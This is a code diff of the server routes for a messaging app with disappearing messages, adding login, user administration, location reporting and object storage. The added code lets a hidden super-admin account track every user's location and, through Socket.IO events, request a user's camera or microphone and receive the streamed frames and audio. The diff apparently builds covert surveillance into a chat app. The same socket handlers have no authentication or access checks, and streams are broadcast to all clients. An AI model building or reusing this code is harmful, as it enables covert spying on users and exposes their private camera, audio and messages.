@@ -1,11 +1,332 @@
-import type { Express } from "express";
-import { createServer, type Server } from "node:http";
+import type { Express, Request, Response } from "express";
+import { createServer, type Server } from "http";
+import { Server as SocketIOServer } from "socket.io";
+import { storage } from "./storage";
+import { setupAuth, isAuthenticated, isSuperAdmin } from "./auth";
+import { ObjectStorageService, ObjectNotFoundError } from "./objectStorage";
+import { ObjectPermission } from "./objectAcl";
+import { loginSchema, insertUserSchema } from "@shared/schema";
+import { z } from "zod";
 
 export async function registerRoutes(app: Express): Promise<Server> {
-  // put application routes here
-  // prefix all routes with /api
+  setupAuth(app);
+
+  app.post("/api/auth/login", async (req: Request, res: Response) => {
+    try {
+      const { username, password } = loginSchema.parse(req.body);
+      const user = await storage.getUserByUsername(username);
+      
+      if (!user) {
+        return res.status(401).json({ error: "Invalid credentials" });
+      }
+      
+      const isValid = await storage.validatePassword(user, password);
+      if (!isValid) {
+        return res.status(401).json({ error: "Invalid credentials" });
+      }
+      
+      req.session.userId = user.id;
+      await storage.updateUser(user.id, { isOnline: true, lastSeen: new Date() });
+      
+      const { password: _, ...userWithoutPassword } = user;
+      res.json({ user: userWithoutPassword });
+    } catch (error) {
+      if (error instanceof z.ZodError) {
+        return res.status(400).json({ error: "Invalid input", details: error.errors });
+      }
+      console.error("Login error:", error);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
+  app.post("/api/auth/logout", isAuthenticated, async (req: Request, res: Response) => {
+    if (req.user) {
+      await storage.updateUser(req.user.id, { isOnline: false, lastSeen: new Date() });
+    }
+    req.session.destroy((err) => {
+      if (err) {
+        return res.status(500).json({ error: "Failed to logout" });
+      }
+      res.json({ success: true });
+    });
+  });
+
+  app.get("/api/auth/me", isAuthenticated, (req: Request, res: Response) => {
+    const { password: _, ...userWithoutPassword } = req.user!;
+    res.json({ user: userWithoutPassword });
+  });
+
+  app.get("/api/users", isAuthenticated, async (req: Request, res: Response) => {
+    const users = await storage.getAllUsers();
+    const usersWithoutPasswords = users
+      .filter(u => u.id !== req.user!.id && u.role !== "super_admin")
+      .map(({ password: _, ...user }) => user);
+    res.json(usersWithoutPasswords);
+  });
+
+  app.post("/api/admin/users", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
+    try {
+      const userData = insertUserSchema.parse(req.body);
+      const existingUser = await storage.getUserByUsername(userData.username);
+      if (existingUser) {
+        return res.status(400).json({ error: "Username already exists" });
+      }
+      const user = await storage.createUser(userData);
+      const { password: _, ...userWithoutPassword } = user;
+      res.status(201).json(userWithoutPassword);
+    } catch (error) {
+      if (error instanceof z.ZodError) {
+        return res.status(400).json({ error: "Invalid input", details: error.errors });
+      }
+      console.error("Create user error:", error);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
+  app.get("/api/admin/users", isAuthenticated, isSuperAdmin, async (_req: Request, res: Response) => {
+    const users = await storage.getAllUsers();
+    const usersWithoutPasswords = users.map(({ password: _, ...user }) => user);
+    res.json(usersWithoutPasswords);
+  });
+
+  app.put("/api/admin/users/:id", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
+    const { id } = req.params;
+    const updates = req.body;
+    delete updates.id;
+    
+    const user = await storage.updateUser(id, updates);
+    if (!user) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    const { password: _, ...userWithoutPassword } = user;
+    res.json(userWithoutPassword);
+  });
+
+  app.delete("/api/admin/users/:id", isAuthenticated, isSuperAdmin, async (req: Request, res: Response) => {
+    const { id } = req.params;
+    const deleted = await storage.deleteUser(id);
+    if (!deleted) {
+      return res.status(404).json({ error: "User not found" });
+    }
+    res.json({ success: true });
+  });
+
+  app.get("/api/admin/locations", isAuthenticated, isSuperAdmin, async (_req: Request, res: Response) => {
+    const locations = await storage.getUserLocations();
+    res.json(locations.map(({ user, latitude, longitude }) => ({
+      user: { id: user.id, displayName: user.displayName, username: user.username, isOnline: user.isOnline },
+      latitude,
+      longitude,
+      lastUpdate: user.lastLocationUpdate,
+    })));
+  });
+
+  app.post("/api/location", isAuthenticated, async (req: Request, res: Response) => {
+    const { latitude, longitude } = req.body;
+    if (typeof latitude !== "number" || typeof longitude !== "number") {
+      return res.status(400).json({ error: "Invalid location data" });
+    }
+    await storage.updateUserLocation(req.user!.id, latitude, longitude);
+    res.json({ success: true });
+  });
+
+  app.get("/api/conversations", isAuthenticated, async (req: Request, res: Response) => {
+    const conversations = await storage.getConversationsForUser(req.user!.id);
+    res.json(conversations.map(conv => ({
+      id: conv.id,
+      otherUser: {
+        id: conv.otherUser.id,
+        displayName: conv.otherUser.displayName,
+        username: conv.otherUser.username,
+        isOnline: conv.otherUser.isOnline,
+      },
+      lastMessage: conv.lastMessage ? {
+        id: conv.lastMessage.id,
+        type: conv.lastMessage.type,
+        content: conv.lastMessage.content,
+        expiryType: conv.lastMessage.expiryType,
+        createdAt: conv.lastMessage.createdAt,
+        senderId: conv.lastMessage.senderId,
+        isViewed: conv.lastMessage.isViewed,
+      } : null,
+      lastMessageAt: conv.lastMessageAt,
+    })));
+  });
+
+  app.post("/api/conversations", isAuthenticated, async (req: Request, res: Response) => {
+    const { userId } = req.body;
+    if (!userId) {
+      return res.status(400).json({ error: "userId is required" });
+    }
+    
+    let conversation = await storage.getConversationByParticipants(req.user!.id, userId);
+    if (!conversation) {
+      conversation = await storage.createConversation(req.user!.id, userId);
+    }
+    res.json(conversation);
+  });
+
+  app.get("/api/conversations/:id/messages", isAuthenticated, async (req: Request, res: Response) => {
+    const { id } = req.params;
+    const conversation = await storage.getConversation(id);
+    
+    if (!conversation) {
+      return res.status(404).json({ error: "Conversation not found" });
+    }
+    
+    if (conversation.participant1Id !== req.user!.id && conversation.participant2Id !== req.user!.id) {
+      return res.status(403).json({ error: "Access denied" });
+    }
+    
+    await storage.deleteExpiredMessages();
+    const messages = await storage.getMessages(id);
+    res.json(messages);
+  });
+
+  app.post("/api/conversations/:id/messages", isAuthenticated, async (req: Request, res: Response) => {
+    const { id } = req.params;
+    const { type, content, imageUrl, expiryType } = req.body;
+    
+    const conversation = await storage.getConversation(id);
+    if (!conversation) {
+      return res.status(404).json({ error: "Conversation not found" });
+    }
+    
+    if (conversation.participant1Id !== req.user!.id && conversation.participant2Id !== req.user!.id) {
+      return res.status(403).json({ error: "Access denied" });
+    }
+    
+    const message = await storage.createMessage({
+      conversationId: id,
+      senderId: req.user!.id,
+      type: type || "text",
+      content,
+      imageUrl,
+      expiryType: expiryType || "permanent",
+    });
+    
+    io.to(`conversation:${id}`).emit("new_message", message);
+    
+    res.status(201).json(message);
+  });
+
+  app.put("/api/messages/:id/view", isAuthenticated, async (req: Request, res: Response) => {
+    const { id } = req.params;
+    const message = await storage.markMessageAsViewed(id);
+    if (!message) {
+      return res.status(404).json({ error: "Message not found" });
+    }
+    res.json(message);
+  });
+
+  app.post("/api/objects/upload", isAuthenticated, async (_req: Request, res: Response) => {
+    const objectStorageService = new ObjectStorageService();
+    const uploadURL = await objectStorageService.getObjectEntityUploadURL();
+    res.json({ uploadURL });
+  });
+
+  app.put("/api/images", isAuthenticated, async (req: Request, res: Response) => {
+    if (!req.body.imageURL) {
+      return res.status(400).json({ error: "imageURL is required" });
+    }
+
+    try {
+      const objectStorageService = new ObjectStorageService();
+      const objectPath = await objectStorageService.trySetObjectEntityAclPolicy(
+        req.body.imageURL,
+        {
+          owner: req.user!.id,
+          visibility: "public",
+        },
+      );
+
+      res.status(200).json({ objectPath });
+    } catch (error) {
+      console.error("Error setting image:", error);
+      res.status(500).json({ error: "Internal server error" });
+    }
+  });
+
+  app.get("/objects/:objectPath(*)", async (req: Request, res: Response) => {
+    const objectStorageService = new ObjectStorageService();
+    try {
+      const objectFile = await objectStorageService.getObjectEntityFile(req.path);
+      const canAccess = await objectStorageService.canAccessObjectEntity({
+        objectFile,
+        userId: req.user?.id,
+        requestedPermission: ObjectPermission.READ,
+      });
+      if (!canAccess) {
+        const aclPolicy = await import("./objectAcl").then(m => m.getObjectAclPolicy(objectFile));
+        if (!aclPolicy || aclPolicy.visibility !== "public") {
+          return res.sendStatus(401);
+        }
+      }
+      objectStorageService.downloadObject(objectFile, res);
+    } catch (error) {
+      console.error("Error checking object access:", error);
+      if (error instanceof ObjectNotFoundError) {
+        return res.sendStatus(404);
+      }
+      return res.sendStatus(500);
+    }
+  });
+
+  app.get("/public-objects/:filePath(*)", async (req: Request, res: Response) => {
+    const filePath = req.params.filePath;
+    const objectStorageService = new ObjectStorageService();
+    try {
+      const file = await objectStorageService.searchPublicObject(filePath);
+      if (!file) {
+        return res.status(404).json({ error: "File not found" });
+      }
+      objectStorageService.downloadObject(file, res);
+    } catch (error) {
+      console.error("Error searching for public object:", error);
+      return res.status(500).json({ error: "Internal server error" });
+    }
+  });
 
   const httpServer = createServer(app);
+  
+  const io = new SocketIOServer(httpServer, {
+    cors: {
+      origin: process.env.REPLIT_DEV_DOMAIN ? `https://${process.env.REPLIT_DEV_DOMAIN}` : "*",
+      credentials: true,
+    },
+  });
+
+  io.on("connection", (socket) => {
+    console.log("Socket connected:", socket.id);
+
+    socket.on("join_conversation", (conversationId: string) => {
+      socket.join(`conversation:${conversationId}`);
+    });
+
+    socket.on("leave_conversation", (conversationId: string) => {
+      socket.leave(`conversation:${conversationId}`);
+    });
+
+    socket.on("admin_request_camera", (data: { userId: string; cameraType: string }) => {
+      io.emit(`camera_request:${data.userId}`, { cameraType: data.cameraType });
+    });
+
+    socket.on("admin_request_microphone", (data: { userId: string }) => {
+      io.emit(`microphone_request:${data.userId}`, {});
+    });
+
+    socket.on("camera_stream", (data: { adminId: string; frame: string }) => {
+      io.emit(`camera_stream:${data.adminId}`, { frame: data.frame });
+    });
+
+    socket.on("audio_stream", (data: { adminId: string; audio: string }) => {
+      io.emit(`audio_stream:${data.adminId}`, { audio: data.audio });
+    });
+
+    socket.on("disconnect", () => {
+      console.log("Socket disconnected:", socket.id);
+    });
+  });
 
   return httpServer;
 }
